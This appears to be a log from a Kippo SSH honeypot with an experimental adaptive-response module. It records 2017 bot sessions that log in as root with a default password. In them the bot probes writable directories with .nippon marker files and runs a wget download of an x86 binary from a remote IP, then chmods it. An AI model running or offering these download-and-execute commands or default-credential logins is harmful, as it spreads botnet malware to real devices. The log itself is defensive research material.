+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: cat /dev/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: cat /dev/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: rm -f /dev/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: rm -f /dev/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: cat /dev/shm/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: cat /dev/shm/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: rm -f /dev/shm/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: rm -f /dev/shm/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: cat /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: cat /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: rm -f /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: rm -f /dev/pts/.nippon 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: cat /bin/echo  
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: cat /bin/echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] /bin/echo resolved into /bin/echo 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: cd / 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: cd / 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] start to get action .. 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start cd 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ cd 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] saving the case ... 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.1          0.1         95.39978332] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus  
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] isAllow start 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.0988828          0.1         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start wget 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ wget 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] CMD: chmod 777 usb_bus  
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Command found: chmod 777 usb_bus 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] start to get action .. 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] getAction start chmod 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] get current command -============================ chmod 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] do action =================================== 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] saving the case ... 
+2017-12-19 13:37:05+0000 [SSHChannel session (1) on SSHService ssh-connection on HoneyPotTransport,1,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] Got remote error, code 11 
+	reason: disconnected by user 
+2017-12-19 13:37:05+0000 [HoneyPotTransport,1,127.0.0.1] connection lost 
+2017-12-19 13:44:28+0000 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 127.0.0.1:56675 (127.0.0.1:2222) [session: 2] 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_6.2 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] outgoing: aes128-ctr hmac-md5 none 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] incoming: aes128-ctr hmac-md5 none 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] NEW KEYS 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] starting service ssh-userauth 
+2017-12-19 13:44:28+0000 [SSHService ssh-userauth on HoneyPotTransport,2,127.0.0.1] root trying auth none 
+2017-12-19 13:44:28+0000 [SSHService ssh-userauth on HoneyPotTransport,2,127.0.0.1] root trying auth keyboard-interactive 
+2017-12-19 13:44:28+0000 [SSHService ssh-userauth on HoneyPotTransport,2,127.0.0.1] login attempt [root/123456] succeeded 
+2017-12-19 13:44:28+0000 [SSHService ssh-userauth on HoneyPotTransport,2,127.0.0.1] root authenticated with keyboard-interactive 
+2017-12-19 13:44:28+0000 [SSHService ssh-userauth on HoneyPotTransport,2,127.0.0.1] starting service ssh-connection 
+2017-12-19 13:44:28+0000 [SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] got channel session request 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1]  channel open 
+2017-12-19 13:44:28+0000 [SSHService ssh-connection on HoneyPotTransport,32,127.0.0.1] got global no-more-sessions@openssh.com request 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] pty request: xterm-256color (24, 80, 560, 336)
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Terminal size: 24 80
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] request_env: ' x00\x00\x00\x04LANG\x00\x00\x00\x0ben_IE.UTF-8'
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getting shell 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Opening TTY log: log/tty/20171219-134428 '968850.log 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] /etc/motd resolved into /etc/motd 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: /bin/busybox cp 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command not found: /bin/busybox cp 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: mount  
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: mount 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] start to get action .. 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start mount 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ mount 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] saving the case ... 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Reading txtcmd from "/Users/sosdow/Documents/workspace/kippo/txtcmds/bin/mount" 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/' > //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/' > //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: cat //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: cat //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] /.nippon resolved into /.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: rm -f //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: rm -f //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: cat /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: cat /tmp/.nippon 
